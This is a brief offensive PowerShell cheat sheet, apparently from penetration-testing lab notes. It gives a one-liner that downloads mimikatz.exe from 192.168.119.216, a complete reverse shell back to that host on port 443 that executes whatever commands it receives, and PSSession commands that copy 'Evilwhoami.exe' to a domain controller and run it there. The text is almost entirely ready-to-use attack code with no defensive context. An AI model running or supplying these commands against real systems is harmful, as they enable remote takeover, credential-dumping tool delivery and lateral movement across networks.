


### PowerShell File Transfers

```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.216/mimikatz.exe','C:\Windows\Tasks\a.exe')"

```

### PowerShell Reverse Shells

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient("192.168.119.216",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Execute CMD On other Host


```powershell

$dcsesh = New-PSSession -Computer SANDBOXDC

Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}

Copy-Item "C:\Users\Public\Evilwhoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh

Invoke-Command -Session $dcsesh -ScriptBlock {C:\Users\Public\Evilwhoami.exe}

```